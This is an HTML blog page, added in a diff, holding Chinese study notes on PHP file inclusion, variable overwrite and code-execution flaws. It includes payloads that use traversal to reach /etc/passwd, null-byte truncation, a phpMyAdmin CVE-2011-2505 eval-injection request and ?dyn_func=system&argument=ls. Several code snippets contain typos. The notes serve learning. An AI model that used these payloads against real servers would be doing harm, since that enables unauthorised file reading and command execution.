@@ -1,0 +1,712 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/blog.jpg">
+  <link rel="icon" href="/img/blog.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1.文件包含漏洞代码注入， 典型代表就是文件包含。原理：注入一段用户可控的代码，让服务端执行常见导致文件包含的函数：php：include（），include_once(),require(),require_once(),fopen(),readfile()…jsp&#x2F;Servlet: ava.io.file(),java.io.fileReader(),…asp: include fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://example.com/2023/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="TTblog">
+<meta property="og:description" content="1.文件包含漏洞代码注入， 典型代表就是文件包含。原理：注入一段用户可控的代码，让服务端执行常见导致文件包含的函数：php：include（），include_once(),require(),require_once(),fopen(),readfile()…jsp&#x2F;Servlet: ava.io.file(),java.io.fileReader(),…asp: include fi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050055034.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050056794.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/34275754/1667876262270-46b869c1-19ef-46cc-94ed-c8e6d5b905ad.png#averageHue=%23ececec&clientId=uc46dca5a-aace-4&from=paste&height=28&id=u8bc5ad09&name=image.png&originHeight=35&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17889&status=done&style=none&taskId=u2912b6db-6cbe-4501-b718-fbb5be1435e&title=&width=520.8">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050056242.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050057157.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050058021.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050058521.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050100751.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050100357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050101327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050101601.png">
+<meta property="article:published_time" content="2023-04-01T08:35:20.000Z">
+<meta property="article:modified_time" content="2023-04-17T14:06:13.117Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050055034.png">
+  
+  
+  
+  <title>文件包含 - TTblog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>不会做题的菜鸡</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>主页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>类别</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件包含"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-01 16:35" pubdate>
+          April 1, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">文件包含</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h1><p>代码注入， 典型代表就是文件包含。<br>原理：注入一段用户可控的代码，让服务端执行<br>常见导致文件包含的函数：<br>php：include（），include_once(),require(),require_once(),fopen(),readfile()…<br>jsp&#x2F;Servlet: ava.io.file(),java.io.fileReader(),…<br>asp: include file,include virtual,…</p>
+<p>include（）<br>include_once()<br>require()<br>,require_once()<br>使用这四个函数包含新文件，不会看包含文件的类型，文件会作为php代码执行。</p>
+<p>利用条件：<br>        （1）.include（）等函数通郭动态变量方式引入<br>（2）.用户能控制动态变量<br>1.1 本地文件包含<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050055034.png" srcset="/img/loading.gif" lazyload alt="image-20230405005517886"><br> file_exists() 函数检查文件或目录是否存在。<br> &#x2F;&#x2F;file_exists() 函数检查文件或目录是否存在。存在将他包含进来。<br>假如:$file&#x3D;..&#x2F;..&#x2F;etc&#x2F;passwd<br>实际代码：<br>include  ’&#x2F;home&#x2F;wwwrun&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php‘   etc&#x2F;passwd.php不存在， 利用0字节（\x00，字符串结束符),截断$file后面的字符串<br>$file&#x3D;..&#x2F;..&#x2F;etc&#x2F;passwd\0 —-&gt;URL  $file&#x3D;..&#x2F;..&#x2F;etc&#x2F;passwd%00</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050056794.png" srcset="/img/loading.gif" lazyload alt="image-20230405005629701"><br><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。<br>**str_replace() **将$value中”\0”替换为’’<br>然而 cloie发现新技巧：利用操作系统对目录最大长度限制，可以不使用0字节截断就可以达到目的，Windows目录字符串长度256字节，linux目录字符串长度4096字节<br>构造.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;abc<br>或&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;abc<br>或..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;<br>除了include（)等四个函数，php中能过对文件进行</p>
+<p>..&#x2F;..&#x2F;..&#x2F; 目录遍历<br>%2e%2e%1f  &#x3D;  ..&#x2F;<br>%2e%2e&#x2F;  &#x3D;  ..&#x2F;<br>%2f&#x3D;&#x2F;<br>%2e&#x3D;.<br>%5e&#x3D;<br>%252e&#x3D;.<br>%252c&#x3D;<br>..%c%af&#x3D;..&#x2F;<br>..%c1%9c&#x3D;..\</p>
+<p>cve-2008-2938 tomcat<strong>目录遍历漏洞</strong><br>context.xml 或server.xml（tomcat配置文件）allowlinking和URIencoding为“UTF-8”攻击者就可以web权限获得重要内容<br><img src="https://cdn.nlark.com/yuque/0/2022/png/34275754/1667876262270-46b869c1-19ef-46cc-94ed-c8e6d5b905ad.png#averageHue=%23ececec&clientId=uc46dca5a-aace-4&from=paste&height=28&id=u8bc5ad09&name=image.png&originHeight=35&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17889&status=done&style=none&taskId=u2912b6db-6cbe-4501-b718-fbb5be1435e&title=&width=520.8" srcset="/img/loading.gif" lazyload alt="image.png"><br>当配置了open_baedir时，失效<br>（open_baedir)限制特定目录php能打开的文件，与safe_mode是否开启无关<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050056242.png" srcset="/img/loading.gif" lazyload alt="image-20230405005656159"><br>open_basedir的值是目录前缀<br>若open_basedir&#x3D;   &#x2F;home&#x2F;app&#x2F;aaa<br>&#x2F;&#x2F;&#x2F;则实际上，以下在允许范围内<br>&#x2F;home&#x2F;app&#x2F;aaa<br>&#x2F;home&#x2F;app&#x2F;aaabbb<br>&#x2F;home&#x2F;app&#x2F;aaa123</p>
+<p>若要指定则open_basedir&#x3D;   &#x2F;home&#x2F;app&#x2F;aaa&#x2F;<br>Windows 多目录用’；‘ ，linux用’：‘<br>&#x2F;&#x2F;可以利用枚举，让用户不可控<br><strong>1.2远程文件包含</strong><br> allowurl_include设置为ON  ，include&#x2F;require可以加载远程文件</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050057157.png" srcset="/img/loading.gif" lazyload alt="image-20230405005726066"></p>
+<p>远程文件包含<br><a target="_blank" rel="noopener" href="http://www.a.com/textb.php?text=http://www.b.com/test1.txt">www.a.com/textb.php?text=http://www.b.com/test1.txt</a>?<br><strong>1.3本地文件包含利用技巧</strong><br>之所以可以执行命令，是因为用户可以控制文件包含的内容<br> (1)包含用户上传的文件。<br>(2)包含 data:&#x2F;&#x2F; 或 php:&#x2F;&#x2F;input 等伪协议。<br>(3)包含Session文件。<br>(4)包含曰志文件，比如Web Server的access log。<br>(5)包含&#x2F;proc&#x2F;self&#x2F;environ 文件。<br>(6)包含上传的临时文件(RFC1867)。<br>(7)包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。<br> session( 只有客户端才能访问，程序为该客户添加一个 session。session中主要保存用户的登录信息、操作信息等等。此 session将在用户访问结束后自动消失)<br> 1.包含用户上传文件能否攻击成功，取决于文件上传功能的设计，比如要求知道用户上传 后文件所在的物理路径，有时这个路径很难猜到。（上传文件的目录不一定是上传文件所在的目录）。<br>2.伪协议如php:&#x2F;&#x2F;input等需要服务器支持，同时要求allowurl_include设置为ON。在PHP5.2.0之后的版本中支持data:伪协议，可以很方便地执行代码，它同样要求allowurl_ include 为ON。<br>**    2变量覆盖漏洞**<br>      **    2.1全局变量覆盖**<br>                    条件：变量未被初始化且能被用户控制<br>                      register_globals为on 最为严重  ，  php4.2.0之后的版本默认变成了pff
+               	</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Register globals:&quot;</span>.(<span class="hljs-keyword">int</span>)ini <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;register globals&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;register_globals&#x27;</span>))&#123; <br>	<span class="hljs-keyword">foreach</span>($ REQUEST aS<span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)<span class="hljs-keyword">unset</span>($&#123;<span class="hljs-variable">$k</span>&#125;);<br>	<span class="hljs-keyword">print</span> <span class="hljs-variable">$a</span>;<br>	<span class="hljs-keyword">print</span> <span class="hljs-variable">$_GET</span>[b];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>$a未初始化，在register_globals为on ，会因为这个代码而出错。<br>而尝试注入globals[a]覆盖全局变量，则可以控制$a的值,<br>(unset()默认只会销毁局部变量，销毁全局变量必须使用$globals)。<br><strong>2.2extract()变量覆盖</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">extract</span> ( <span class="hljs-keyword">array</span> <span class="hljs-variable">$var_array</span> [,<span class="hljs-keyword">int</span> <span class="hljs-variable">$extract_type</span>[,<span class="hljs-keyword">string</span> <span class="hljs-variable">$prefix</span>]] )<br></code></pre></td></tr></table></figure>
+<p>第二个参数指定函数变量导入符号表时的行为，两个值extr_overwrite和extr_skip<br>是extr_overwrite时，变量名冲突，覆盖。<br>是extr_skip时，变量名冲突，不覆盖。<br>若未指定，默认为extr_overwrite。<br><strong>2.3遍历初始化变量</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$chs</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>($ POST &amp;&amp; <span class="hljs-variable">$charset</span>!=<span class="hljs-string">&#x27;utf-8&#x27;</span>)&#123;<br>	<span class="hljs-variable">$chs</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Chinese</span>(UTF-<span class="hljs-number">8</span><span class="hljs-string">&#x27;$charset&#x27;</span>); <br>	<span class="hljs-keyword">foreach</span>($ POST <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt; <span class="hljs-variable">$value</span>) &#123;<br>		<span class="hljs-variable">$$key</span>=<span class="hljs-variable">$chs</span>-&gt;<span class="hljs-title function_ invoke__">Convert</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$chs</span>);<br><br></code></pre></td></tr></table></figure>
+<p>传chs，会覆盖$chs的值，<br><strong>2.4import_request_variables变量覆盖</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> import request <span class="hljs-title function_ invoke__">variables</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$types</span> [，<span class="hljs-keyword">string</span> <span class="hljs-variable">$prefix</span>])<br></code></pre></td></tr></table></figure>
+<p>import_request_variables会将get，post，cookie中的变量导入到全局，使用这个函数只需要指定类型，第二个参数是导入变量的添加的前缀，如果没有就覆盖全局变量。<br><strong>2.5parse_str()变量覆盖</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">void_parse_str</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span> [,<span class="hljs-keyword">array</span>&amp;<span class="hljs-variable">$arr</span>])<br></code></pre></td></tr></table></figure>
+<p>parse_str()函数解析URL的query string，当参数能被用户控制时，导致变量覆盖。<br>在**[BJDCTF2020]Mark loves cat题中** 利用了变量覆盖利用了exit($is)<br><strong>3.代码执行漏洞</strong><br>存在函数输入且有可以执行代码的危险函数<br><strong>3.1危险函数执行代码</strong><br>危险函数 popen(),system(),passthru(),exec()。<br>phpmyadmin版本3.3.10.2与3.4.3.1存在变量覆盖漏洞CVE-2011-2505,漏洞存在于libraries&#x2F;swekey&#x2F;swekey.auth,lib.php。<br>通过parse_str（）覆盖变量漏洞，且session保存在服务器端，所以可以通过覆盖$_session,原本程序执行到  session_destroy()将销毁session   ，但是session_write_close()已经把$session保存下来了,<br>session_id试图切换session，会导致XSS,SQL注入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-variable">$ret</span>.=<span class="hljs-string">&#x27;/*Server:&#x27;</span><span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$cf</span>-&gt;<span class="hljs-title function_ invoke__">qetServerName</span>(<span class="hljs-variable">$id</span>)，<span class="hljs-string">&#x27;*/&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>)<span class="hljs-string">&quot;[<span class="hljs-subst">$id</span>]*/&quot;</span> .<span class="hljs-variable">$crlf</span>.<span class="hljs-string">&#x27;$i++;&#x27;</span>.<span class="hljs-variable">$crlf</span>;<br><br></code></pre></td></tr></table></figure>
+<p>对strtr处理却没对$id做处理。$id是数组变量$c[‘sercers’]的key。<br>$c是函数的返回结果：$c&#x3D;$cf-&gt;getconfig();</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Returns configuration array(full, multidimensional format)</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConfig</span>(<span class="hljs-params"></span>)</span>&#123;<br>	<span class="hljs-variable">$c</span>=<span class="hljs-variable">$SESSION</span>[<span class="hljs-variable language_">$this</span>-&gt;id];<br>	<span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;cfgUpdateReadMapping <span class="hljs-keyword">as</span> <span class="hljs-variable">$map_to</span>=&gt; <span class="hljs-variable">$map</span> <span class="hljs-keyword">from</span>)&#123;<br>		<span class="hljs-title function_ invoke__">PMA_array_write</span>(<span class="hljs-variable">$map_to</span>, <span class="hljs-variable">$c</span>, PMA <span class="hljs-keyword">array</span> <span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$map_from</span>, <span class="hljs-variable">$c</span>)); PMA <span class="hljs-title function_ invoke__">array_remove</span>(<span class="hljs-variable">$map_from</span>, <span class="hljs-variable">$c</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$c</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>$c是session中来的，通过parse_str（）覆盖session中任意变量的值，*&#x2F;闭合注释符，插入代码执行（插入到config&#x2F;config.ini.php）。<br>条件是config目录存在且可写，很多时候管理员在初始化完成后删除config目录。<br>wofeiwo写的的一段例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">uri=<span class="hljs-string">&quot;/libraries/auth/swekey/swekey.auth.lib.php?session_to_unset=HelloThere&amp;_SESSION[ConfigFile0]</span><br><span class="hljs-string">[Servers][*/eval(getenv(&#x27;HTTP CODE&#x27;));</span><br><span class="hljs-string">/*][host]=Hacked+By+PMA&amp; SESSION[ConfiaFilellSe rvers]</span><br><span class="hljs-string">[*/eval(getenv(HTTP CODE));</span><br><span class="hljs-string">/*][host]=Hacked+By+PMA&quot;</span><br></code></pre></td></tr></table></figure>
+<pre><code class="hljs">        &quot;*/ecal()/*&quot;注入到了session变量的key中
+</code></pre>
+<p>MyBB1.4远程代码执行<br>flyh4t发现的MyBB1.4 admin remote code execution vulnerability<br>首先MyBB代码中存在eval（）函数<br><strong>挖掘漏洞过程，找危险函数，回溯函数调用过程，看整个过程是否有可控输入。</strong><br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050058021.png" srcset="/img/loading.gif" lazyload alt="image-20230405005817953"><br>eval（）输入来自于$templates-&gt;get(“index”),找调用过程，get是数据库取出的，取出时addslashes（）做了处理，可以通过编辑模板功能将数据写入数据库，调用前台文件，使eval（）执行。但需要处理敏感字符<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050058521.png" srcset="/img/loading.gif" lazyload alt="image-20230405005832434"><br><strong>3.2“文件写入”执行代码</strong><br>在database.inc.php导入zip文件时，存在写文操作，对其安全的判断过于简单，导致用户可以将文件内容改为php代码执行<br>控制文件后缀为’&#x2F;.sql’<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050100751.png" srcset="/img/loading.gif" lazyload alt="image-20230405010005611"><br>可apache不认识.sql将其解析为php执行。<br><strong>3.3其他执行代码方式</strong><br>直接执行带码的函数：<br>        eval(),system(),exec(),shell_exec(),passthru(),escapesheelcmd(),pcntl_exce()等。<br>文件包含：include(),include_once(),require(),require_once()。<br>本地文件写入：file_put_contents(),fwrite(),fputs()等<br>preg_replace()代码执行：<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050100357.png" srcset="/img/loading.gif" lazyload alt="image-20230405010032242"><br>动态函数执行：<br>用户自定义的动态函数可以导致代码执行<br><?php
+$dyn_func= $ GET['dyn func'];
+$argument=$GET['argument'];
+$dyn_finc($argument);
+?><br>可以导致代码直接执行：url&#x2F;index.php?dyn_finc&#x3D;system&amp;argument&#x3D;ls<br>类似的还有create_function()函数：</p>
+<?php
+$foobar=$ GET['foobar'];
+$dyn_func=create function('$foobar’"echo $foobar;");
+$dyn_func('');
+?>
+<p>payload：url&#x2F;index.php?dyn_finc&#x3D;system（’ls‘）<br><strong>curly Syntax</strong><br>curly Syntax会导致命令执行，它将执行花括号间的代码，并将结果替换回去。<br><strong>回调函数执行代码</strong><br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050101327.png" srcset="/img/loading.gif" lazyload alt="image-20230405010057687"><br>ob_strat()也可以执行回调函数<br><strong>unserialize（）导致代码执行</strong><br>他将反序列化的数据重新映射为PHP变量，unserialize在执行时如果定义了**_destruct()<strong>函数或</strong>_wakeup()**函数，则这两个函数会被执行<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050101601.png" srcset="/img/loading.gif" lazyload alt="image-20230405010135513"><br>payload：可以先在本地搭建环境测试payload。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/php/" class="category-chain-item">php</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件包含</div>
+      <div>http://example.com/2023/04/01/文件包含/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 1, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/06/web%E5%9F%BA%E7%A1%80%E7%AF%87/" title="web基础篇">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">web基础篇</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/27/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" title="变量覆盖">
+                        <span class="hidden-mobile">变量覆盖</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
